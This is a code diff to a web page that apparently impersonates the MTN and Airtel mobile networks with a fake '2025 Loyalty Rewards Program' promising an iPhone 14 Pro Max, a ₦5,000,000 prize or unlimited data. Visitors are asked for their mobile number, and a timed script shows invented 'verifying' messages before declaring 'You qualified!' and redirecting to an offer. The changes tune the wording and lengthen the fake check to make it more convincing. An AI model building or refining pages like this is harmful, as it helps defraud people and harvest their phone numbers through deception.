@@ -46,8 +46,14 @@
       border-radius: 8px;
       border: 2px solid #333;
     }
+    .below-image-text {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: #ccc;
+    }
     .form-group {
-      margin-top: 20px;
+      margin-top: 10px;
     }
     input[type="tel"] {
       width: 100%;
@@ -153,13 +159,16 @@
     <div class="header">
       <h1>2025 Loyalty Rewards Program</h1>
       <p>
-        Selected MTN and Airtel users may be eligible to receive a <strong>free iPhone 14 Pro Max</strong>, <strong>₦5,000,000 cash prize</strong>, or <strong>unlimited data</strong>.<br>
-        Enter your number to check eligibility.
+        As part of our 2025 Customer Rewards Program, selected users may be eligible to receive a free iPhone 14 Pro Max, ₦5,000,000 cash prize or unlimited data bundle.
       </p>
     </div><div class="image-row">
   <img src="https://i.postimg.cc/DZwDq4q4/Screenshot-20250731-095622-2.jpg" alt="iPhone" />
   <img src="https://i.postimg.cc/JnsffBGV/IMG-20250302-110834-161.jpg" alt="Cash" />
   <img src="https://i.postimg.cc/h4p4WVC6/Screenshot-20250731-071855.jpg" alt="Data" />
+</div>
+
+<div class="below-image-text">
+  Enter your mobile number below to check if you're qualified
 </div>
 
 <div class="form-group">
@@ -195,23 +204,24 @@
       const messages = [
         "Checking eligibility...",
         "Verifying mobile number...",
-        "Confirming network match...",
-        "Finalizing eligibility...",
+        "",
         "Almost done...",
         "You qualified!"
       ];
 
       let index = 0;
       const interval = setInterval(() => {
-        document.getElementById("loadingMessage").innerText = messages[index];
+        if (messages[index]) {
+          document.getElementById("loadingMessage").innerText = messages[index];
+        }
         index++;
         if (index >= messages.length) clearInterval(interval);
-      }, 1000);
+      }, 1800); // total 9 seconds with 5 messages
 
       setTimeout(() => {
         document.getElementById('loading').style.display = 'none';
         document.getElementById('result').style.display = 'flex';
-      }, 6000);
+      }, 9000);
     }
 
     function redirectToOffer() {
